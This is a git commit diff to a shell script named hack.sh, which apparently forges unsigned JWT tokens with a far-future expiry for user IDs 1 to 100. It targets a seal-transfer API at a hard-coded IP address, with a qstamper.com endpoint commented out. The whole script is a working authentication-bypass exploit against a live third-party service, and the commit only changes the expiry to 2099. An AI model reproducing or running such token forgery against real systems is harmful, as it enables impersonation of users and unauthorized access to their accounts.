18556e0032a82547d1591725567651465c50b4bc
Al Zee <z@alz.ee>
2022-04-26 14:31:04 +0800

    nth

--- hack.sh
+++ hack.sh
@@ -5,11 +5,11 @@
 QSTAMP_API_URL="http://1.116.190.119/traffic/api/v2"
 # QSTAMP_API_URL="https://yunxi.qstamper.com/sealTransferApi"
 header=eyJhbGciOiJIUzI1NiJ9 # {"alg":"HS256"}
+exp=$(date +%s -d'2099-12-31')
 
 for i in {1..100}
 do
-    # exp: Sun Jan 4 08:24:39 PM CST 2054
-    payload=$(echo -n "{\"exp\":2651142279,\"username\":\"$i\"}" | basenc --base64url)
+    payload=$(echo -n "{\"exp\":$exp,\"username\":\"$i\"}" | basenc --base64url)
     payload=${payload%%=*}
     token=$header.$payload.
     echo uid: $i, token: $token
